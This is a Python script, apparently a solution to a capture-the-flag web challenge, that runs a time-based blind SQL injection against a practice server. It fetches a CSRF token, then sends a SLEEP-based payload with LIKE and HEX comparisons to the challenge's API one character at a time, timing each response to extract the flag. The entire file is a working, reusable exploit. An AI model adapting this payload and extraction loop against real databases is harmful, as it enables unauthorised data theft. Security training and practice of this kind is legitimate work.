import requests
import binascii
import time

EXS = '0123456789abcdef'


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    




def main():


    payload = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{}%')='1"
    
    inj = Inj('http://web-17.challs.olicyber.it')

    result = ''

    while True:
        for c in EXS:
            print('Flag HEX: {}'.format(result + c), end='\r')
            question = payload.format(result + c)
            start = time.time()
            response, error = inj.time(question)
            if time.time() - start > 1: # We have a match!
                result += c
                break
        else:
            print()
            break
    
    print(binascii.unhexlify(result))

if __name__ == '__main__':
    main()